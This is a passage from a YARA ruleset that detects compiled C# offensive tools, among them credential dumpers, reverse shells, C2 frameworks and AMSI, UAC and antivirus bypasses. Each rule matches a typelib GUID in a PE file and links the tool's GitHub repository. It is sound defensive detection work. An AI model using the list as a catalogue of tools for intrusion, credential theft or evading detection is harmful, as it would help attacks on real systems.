red/black-team tools via typelibguid\"\n        reference = \"https://github.com/xxczaki/logger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9e92a883-3c8b-4572-a73e-bb3e61cfdc16\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Internal_Monologue {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/eladshamir/Internal-Monologue\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0c0333db-8f00-4b68-b1db-18a9cacc1486\" ascii nocase wide\n        $typelibguid1 = \"84701ace-c584-4886-a3cf-76c57f6e801a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_GRAT2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/r3nhat/GRAT2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5e7fce78-1977-444f-a18e-987d708a2cff\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_PowerShdll {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/p3nt4/PowerShdll\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"36ebf9aa-2f37-4f1d-a2f1-f2a45deeaf21\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CsharpAmsiBypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/WayneJLee/CsharpAmsiBypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4ab3b95d-373c-4197-8ee3-fe0fa66ca122\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_HastySeries {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/obscuritylabs/HastySeries\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8435531d-675c-4270-85bf-60db7653bcf6\" ascii nocase wide\n        $typelibguid1 = \"47db989f-7e33-4e6b-a4a5-c392b429264b\" ascii nocase wide\n        $typelibguid2 = \"300c7489-a05f-4035-8826-261fa449dd96\" ascii nocase wide\n        $typelibguid3 = \"41bf8781-ae04-4d80-b38d-707584bf796b\" ascii nocase wide\n        $typelibguid4 = \"620ed459-18de-4359-bfb0-6d0c4841b6f6\" ascii nocase wide\n        $typelibguid5 = \"91e7cdfe-0945-45a7-9eaa-0933afe381f2\" ascii nocase wide\n        $typelibguid6 = \"c28e121a-60ca-4c21-af4b-93eb237b882f\" ascii nocase wide\n        $typelibguid7 = \"698fac7a-bff1-4c24-b2c3-173a6aae15bf\" ascii nocase wide\n        $typelibguid8 = \"63a40d94-5318-42ad-a573-e3a1c1284c57\" ascii nocase wide\n        $typelibguid9 = \"56b8311b-04b8-4e57-bb58-d62adc0d2e68\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DreamProtectorFree {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Paskowsky/DreamProtectorFree\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f7e8a902-2378-426a-bfa5-6b14c4b40aa3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RedSharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/padovah4ck/RedSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"30b2e0cf-34dd-4614-a5ca-6578fb684aea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ESC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NetSPI/ESC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"06260ce5-61f4-4b81-ad83-7d01c3b37921\" ascii nocase wide\n        $typelibguid1 = \"87fc7ede-4dae-4f00-ac77-9c40803e8248\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Csharp_Loader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Csharp-Loader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5fd7f9fc-0618-4dde-a6a0-9faefe96c8a1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_bantam {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/gellin/bantam\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"14c79bda-2ce6-424d-bd49-4f8d68630b7b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpTask {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpTask\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"13e90a4d-bf7a-4d5a-9979-8b113e3166be\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_WindowsPlague {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/RITRedteam/WindowsPlague\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"cdf8b024-70c9-413a-ade3-846a43845e99\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Misc_CSharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/Misc-CSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d1421ba3-c60b-42a0-98f9-92ba4e653f3d\" ascii nocase wide\n        $typelibguid1 = \"2afac0dd-f46f-4f95-8a93-dc17b4f9a3a1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSpray {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpSpray\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"51c6e016-1428-441d-82e9-bb0eb599bbc8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Obfuscator {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/3xpl01tc0d3r/Obfuscator\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8fe5b811-a2cb-417f-af93-6a3cf6650af1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SafetyKatz {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SafetyKatz\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8347e81b-89fc-42a9-b22c-f59a6a572dec\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Dropless_Malware {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Dropless-Malware\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"23b739f7-2355-491e-a7cd-a8485d39d6d6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UAC_SilentClean {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/EncodeGroup/UAC-SilentClean\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"948152a4-a4a1-4260-a224-204255bfee72\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DesktopGrabber {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/DesktopGrabber\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"e6aa0cd5-9537-47a0-8c85-1fbe284a4380\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_wsManager {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/guillaC/wsManager\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9480809e-5472-44f3-b076-dcdf7379e766\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UglyEXe {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fashionproof/UglyEXe\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"233de44b-4ec1-475d-a7d6-16da48d6fc8d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SharpDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"79c9bba3-a0ea-431c-866c-77004802d8a0\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_EducationalRAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/securesean/EducationalRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8a18fbcf-8cac-482d-8ab7-08a44f0e278e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Stealth_Kid_RAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ctsecurity/Stealth-Kid-RAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"bf43cd33-c259-4711-8a0e-1a5c6c13811d\" ascii nocase wide\n        $typelibguid1 = \"e5b9df9b-a9e4-4754-8731-efc4e2667d88\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCradle {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/anthemtotheego/SharpCradle\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f70d2b71-4aae-4b24-9dae-55bc819c78bb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BypassUAC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cnsimo/BypassUAC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4e7c140d-bcc4-4b15-8c11-adb4e54cc39a\" ascii nocase wide\n        $typelibguid1 = \"cec553a7-1370-4bbc-9aae-b2f5dbde32b0\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_hanzoInjection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/P0cL4bs/hanzoInjection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"32e22e25-b033-4d98-a0b3-3d2c3850f06c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_clr_meterpreter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/OJ/clr-meterpreter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6840b249-1a0e-433b-be79-a927696ea4b3\" ascii nocase wide\n        $typelibguid1 = \"67c09d37-ac18-4f15-8dd6-b5da721c0df6\" ascii nocase wide\n        $typelibguid2 = \"e05d0deb-d724-4448-8c4c-53d6a8e670f3\" ascii nocase wide\n        $typelibguid3 = \"c3cc72bf-62a2-4034-af66-e66da73e425d\" ascii nocase wide\n        $typelibguid4 = \"7ace3762-d8e1-4969-a5a0-dcaf7b18164e\" ascii nocase wide\n        $typelibguid5 = \"3296e4a3-94b5-4232-b423-44f4c7421cb3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BYTAGE {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/KNIF/BYTAGE\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8e46ba56-e877-4dec-be1e-394cb1b5b9de\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_MultiOS_ReverseShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/belane/MultiOS_ReverseShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"df0dd7a1-9f6b-4b0f-801e-e17e73b0801d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_HideFromAMSI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0r13lc0ch4v1/HideFromAMSI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"b91d2d44-794c-49b8-8a75-2fbec3fe3fe3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DotNetAVBypass_Master {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/lockfale/DotNetAVBypass-Master\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4854c8dc-82b0-4162-86e0-a5bbcbc10240\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpDPAPI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SharpDPAPI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5f026c27-f8e6-4052-b231-8451c6a73838\" ascii nocase wide\n        $typelibguid1 = \"2f00a05b-263d-4fcc-846b-da82bd684603\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Telegra_Csharp_C2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/sf197/Telegra_Csharp_C2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1d79fabc-2ba2-4604-a4b6-045027340c85\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCompile {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SpiderLabs/SharpCompile\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"63f81b73-ff18-4a36-b095-fdcb4776da4c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Carbuncle {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/checkymander/Carbuncle\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3f239b73-88ae-413b-b8c8-c01a35a0d92e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_OSSFileTool {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/B1eed/OSSFileTool\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"207aca5d-dcd6-41fb-8465-58b39efcde8b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Rubeus {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/Rubeus\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"658c8b7f-3664-4a95-9572-a3e5871dfc06\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Simple_Loader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cribdragg3r/Simple-Loader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"035ae711-c0e9-41da-a9a2-6523865e8694\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Minidump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/3xpl01tc0d3r/Minidump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"15c241aa-e73c-4b38-9489-9a344ac268a3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpBypassUAC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FatRodzianko/SharpBypassUAC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0d588c86-c680-4b0d-9aed-418f1bb94255\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpPack {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Lexus89/SharpPack\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid1 = \"b59c7741-d522-4a41-bf4d-9badddebb84a\" ascii nocase wide\n        $typelibguid2 = \"fd6bdf7a-fef4-4b28-9027-5bf750f08048\" ascii nocase wide\n        $typelibguid3 = \"6dd22880-dac5-4b4d-9c91-8c35cc7b8180\" ascii nocase wide\n        $typelibguid5 = \"f3037587-1a3b-41f1-aa71-b026efdb2a82\" ascii nocase wide\n        $typelibguid6 = \"41a90a6a-f9ed-4a2f-8448-d544ec1fd753\" ascii nocase wide\n        $typelibguid7 = \"3787435b-8352-4bd8-a1c6-e5a1b73921f4\" ascii nocase wide\n        $typelibguid8 = \"fdd654f5-5c54-4d93-bf8e-faf11b00e3e9\" ascii nocase wide\n        $typelibguid9 = \"aec32155-d589-4150-8fe7-2900df4554c8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Salsa_tools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Hackplayers/Salsa-tools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"276004bb-5200-4381-843c-934e4c385b66\" ascii nocase wide\n        $typelibguid1 = \"cfcbf7b6-1c69-4b1f-8651-6bdb4b55f6b9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_WindowsDefender_Payload_Downloader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/notkohlrexo/WindowsDefender-Payload-Downloader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2f8b4d26-7620-4e11-b296-bc46eba3adfc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Privilege_Escalation {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Mrakovic-ORG/Privilege_Escalation\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"ed54b904-5645-4830-8e68-52fd9ecbb2eb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Marauder {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/maraudershell/Marauder\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fff0a9a3-dfd4-402b-a251-6046d765ad78\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AV_Evasion_Tool {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/1y0n/AV_Evasion_Tool\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1937ee16-57d7-4a5f-88f4-024244f19dc6\" ascii nocase wide\n        $typelibguid1 = \"7898617d-08d2-4297-adfe-5edd5c1b828b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Fenrir {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nccgroup/Fenrir\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"aecec195-f143-4d02-b946-df0e1433bd2e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_StormKitty {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/StormKitty\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a16abbb4-985b-4db2-a80c-21268b26c73d\" ascii nocase wide\n        $typelibguid1 = \"98075331-1f86-48c8-ae29-29da39a8f98b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Crypter_Runtime_AV_s_bypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/netreverse/Crypter-Runtime-AV-s-bypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c25e39a9-8215-43aa-96a3-da0e9512ec18\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RunAsUser {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/atthacks/RunAsUser\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9dff282c-93b9-4063-bf8a-b6798371d35a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_HWIDbypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/yunseok/HWIDbypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"47e08791-d124-4746-bc50-24bd1ee719a6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_XORedReflectiveDLL {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/r3nhat/XORedReflectiveDLL\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c0e49392-04e3-4abb-b931-5202e0eb4c73\" ascii nocase wide\n        $typelibguid1 = \"30eef7d6-cee8-490b-829f-082041bc3141\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Sharp_Suite {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/Sharp-Suite\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"467ee2a9-2f01-4a71-9647-2a2d9c31e608\" ascii nocase wide\n        $typelibguid1 = \"5611236e-2557-45b8-be29-5d1f074d199e\" ascii nocase wide\n        $typelibguid2 = \"447edefc-b429-42bc-b3bc-63a9af19dbd6\" ascii nocase wide\n        $typelibguid3 = \"eacaa2b8-43e5-4888-826d-2f6902e16546\" ascii nocase wide\n        $typelibguid4 = \"a3b7c697-4bb6-455d-9fda-4ab54ae4c8d2\" ascii nocase wide\n        $typelibguid5 = \"a5f883ce-1f96-4456-bb35-40229191420c\" ascii nocase wide\n        $typelibguid6 = \"28978103-d90d-4618-b22e-222727f40313\" ascii nocase wide\n        $typelibguid7 = \"252676f8-8a19-4664-bfb8-5a947e48c32a\" ascii nocase wide\n        $typelibguid8 = \"414187db-5feb-43e5-a383-caa48b5395f1\" ascii nocase wide\n        $typelibguid9 = \"0c70c839-9565-4881-8ea1-408c1ebe38ce\" ascii nocase wide\n        $typelibguid10 = \"0a382d9a-897f-431a-81c2-a4e08392c587\" ascii nocase wide\n        $typelibguid11 = \"629f86e6-44fe-4c9c-b043-1c9b64be6d5a\" ascii nocase wide\n        $typelibguid12 = \"f0d28809-b712-4380-9a59-407b7b2badd5\" ascii nocase wide\n        $typelibguid13 = \"956a5a4d-2007-4857-9259-51cd0fb5312a\" ascii nocase wide\n        $typelibguid14 = \"53f622eb-0ca3-4e9b-9dc8-30c832df1c7b\" ascii nocase wide\n        $typelibguid15 = \"72019dfe-608e-4ab2-a8f1-66c95c425620\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of 